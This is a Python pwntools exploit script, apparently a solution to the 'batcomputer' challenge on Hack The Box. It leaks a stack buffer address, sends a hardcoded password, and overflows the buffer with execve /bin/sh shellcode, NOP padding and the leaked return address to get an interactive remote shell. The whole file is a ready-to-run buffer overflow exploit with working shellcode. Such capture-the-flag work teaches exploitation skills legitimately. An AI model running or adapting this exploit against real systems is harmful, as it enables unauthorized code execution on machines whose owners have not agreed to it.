#!/usr/bin/python3
"""
    Author: Joshua Bailey
    This code exploits a buffer overflow in the batcomputer binary. This binary does not have any protections turned on making
    exploitation fairly simple. Test the local_exploit.py first and ensure you get a shell on your machine before trying this
    remote exploit. Although you shouldn't run into any issues locally or remotely it's always good to test it on your local 
    machine first. You'll need pwntools installed on your machine. You can install it with the following command:
    pip3 install pwntools
"""

from pwn import *

# Shellcode taken from http://shell-storm.org/shellcode/files/shellcode-905.php
shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
payload = b""
print("Length of shellcode: ", len(shellcode))
target = process("nc")
target.sendline("206.189.121.131 30346") # Change this IP/Port to the one that gets assigned when you start your instance on HTB

print(target.recvuntil(b">", drop=False))
info("Getting vulnerable buffer address...")
target.sendline(b'1') # Send option 1 to get address of vulnerable buffer

buffer_address = target.recvuntil(b">", drop=False)
buffer_address = p64(int(buffer_address[53:67], 16)) # Convert buffer_address to a little-endian address
info("Vulnerable buffer address: %s" % buffer_address)
info("Generating payload...")
payload += shellcode
payload += b"\x90" * (84 - len(shellcode)) # Padding with NOPs
payload += buffer_address # Tack on the address of the vulnerable buffer
info("Payload generated")
info("Payload size: %d" % len(payload))
info("Payload: %s" % payload)

target.sendline(b'2')
print(target.recvuntil(b"password:", drop=False))
info("Sending password...")
target.sendline(b'b4tp@$$w0rd!')

print(target.recvuntil("commands: ", drop=False))
info("Sending payload...")
target.sendline(payload)
print(target.recvuntil("that!", drop=False))
print(target.recvuntil(b">", drop=False))
target.sendline(b'3')
info("Payload sent! Get ready for a shell!!!")
print(target.recvuntil(b"Alfred?", drop=False))
target.interactive()